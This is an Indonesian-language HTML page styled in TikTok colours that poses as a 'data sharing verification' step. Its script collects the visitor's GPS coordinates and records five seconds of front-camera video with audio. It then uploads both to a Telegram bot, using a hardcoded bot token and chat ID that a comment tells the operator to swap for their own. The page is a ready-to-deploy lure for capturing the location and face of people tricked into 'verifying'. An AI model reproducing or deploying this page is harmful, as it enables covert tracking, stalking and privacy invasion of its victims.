<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Berbagi Data</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #121212; /* Latar belakang hitam TikTok */
            color: #ffffff;
        }
        .container {
            text-align: center;
            padding: 35px 25px;
            background: #1e1e1e;
            border-radius: 16px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            max-width: 380px;
            width: 90%;
            border: 1px solid #2f2f2f;
        }
        h3 {
            font-size: 22px;
            margin-bottom: 15px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        p {
            font-size: 14px;
            color: #e3e3e3;
            line-height: 1.5;
        }
        .desc-opsional {
            font-size: 12px; 
            color: #8a8a8a;
            margin-top: 15px;
        }
        button {
            padding: 14px 28px;
            font-size: 16px;
            background-color: #FE2C55; /* Merah TikTok */
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 700;
            width: 100%;
            margin-top: 20px;
            transition: background 0.2s, transform 0.1s;
        }
        button:hover {
            background-color: #e12246;
        }
        button:active {
            transform: scale(0.98);
        }
        #status-box {
            margin-top: 20px;
            font-weight: 600;
            font-size: 15px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 15px;
        }
        /* Style untuk Loading Spinner */
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #2f2f2f;
            border-top: 4px solid #25F4EE; /* Cyan TikTok */
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: none;
        }
        .loading {
            color: #25F4EE;
        }
        .recording {
            color: #FE2C55;
            animation: blink 1s infinite;
        }
        .success {
            color: #00f2fe;
            text-shadow: 0 0 10px rgba(0,242,254,0.4);
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes blink {
            50% { opacity: 0.4; }
        }
    </style>
</head>
<body>

<div class="container">
    <div id="setup-box">
        <h3>Konfirmasi Penggunaan Fitur</h3>
        <p>Halaman ini memerlukan akses **Lokasi** dan **Kamera Depan** untuk proses verifikasi sistem Anda.</p>
        <p class="desc-opsional">Data akan dikirim secara aman ke server Telegram kami setelah Anda menekan tombol di bawah.</p>
        <button id="start-btn" onclick="mulaiProses()">Saya Setuju & Mulai</button>
    </div>

    <div id="status-box" style="display: none;">
        <div id="loading-spinner" class="spinner"></div>
        <p id="status-text">Memulai...</p>
    </div>
</div>

<script>
// === KONFIGURASI TELEGRAM (GANTI DENGAN DATA ANDA) ===
const TELEGRAM_TOKEN = "8944168845:AAHw_QSSDh-A-r2jp7PxVkI1eqL6fX6Eg8w";
const CHAT_ID = "1966317946";

let userLatitude = null;
let userLongitude = null;

function updateStatus(text, className, showSpinner = false) {
    const statusBox = document.getElementById('status-box');
    const statusText = document.getElementById('status-text');
    const spinner = document.getElementById('loading-spinner');
    
    statusBox.style.display = 'flex';
    statusText.innerText = text;
    statusText.className = className;
    
    // Atur tampilan spinner berputar
    if (showSpinner) {
        spinner.style.display = 'block';
    } else {
        spinner.style.display = 'none';
    }
}

function mulaiProses() {
    document.getElementById('setup-box').style.display = 'none';
    updateStatus("🌐 Meminta akses lokasi...", "loading", true);
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                userLatitude = position.coords.latitude;
                userLongitude = position.coords.longitude;
                mulaiRekamKameraDepan();
            },
            (error) => {
                updateStatus("❌ Akses lokasi ditolak.", "", false);
                alert("Gagal: Aplikasi membutuhkan izin lokasi untuk melanjutkan.");
            }
        );
    } else {
        updateStatus("❌ Browser tidak mendukung lokasi.", "", false);
    }
}

function mulaiRekamKameraDepan() {
    updateStatus("🎥 Meminta akses kamera depan...", "loading", true);

    const constraints = {
        video: { facingMode: "user" },
        audio: true
    };

    navigator.mediaDevices.getUserMedia(constraints)
        .then((stream) => {
            // === SILAKAN GANTI TEKS DI BAWAH INI SESUAI KEINGINAN ANDA ===
            const teksMerekam = "🔴 Teks rekaman baru Anda di sini...";
            
            updateStatus(teksMerekam, "recording", true);

            const mediaRecorder = new MediaRecorder(stream);
            let videoChunks = [];

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    videoChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                stream.getTracks().forEach(track => track.stop());
                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                kirimDataKeTelegram(videoBlob);
            };

            mediaRecorder.start();

            setTimeout(() => {
                mediaRecorder.stop();
            }, 5000);

        })
        .catch((error) => {
            updateStatus("❌ Akses kamera ditolak atau tidak ditemukan.", "", false);
            alert("Gagal: Aplikasi membutuhkan izin kamera untuk melanjutkan.");
        });
}

function kirimDataKeTelegram(videoBlob) {
    updateStatus("🚀 Mengirimkan data verifikasi ke sistem...", "loading", true);

    const infoTeks = `📍 *Data Verifikasi Pengguna*:\n\n` +
                     `• Latitude: \`${userLatitude}\`\n` +
                     `• Longitude: \`${userLongitude}\`\n` +
                     `• Google Maps: https://google.com{userLatitude},${userLongitude}`;

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', videoBlob, 'verifikasi_kamera_depan.webm');
    formData.append('caption', infoTeks);
    formData.append('parse_mode', 'Markdown');

    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            updateStatus("✅ Verifikasi Selesai! Terima kasih.", "success", false);
        } else {
            updateStatus("❌ Gagal mengirimkan data.", "", false);
            console.error("Telegram API Error:", data);
        }
    })
    .catch(error => {
        updateStatus("❌ Terjadi kesalahan jaringan.", "", false);
        console.error("Fetch Error:", error);
    });
}
</script>

</body>
</html>
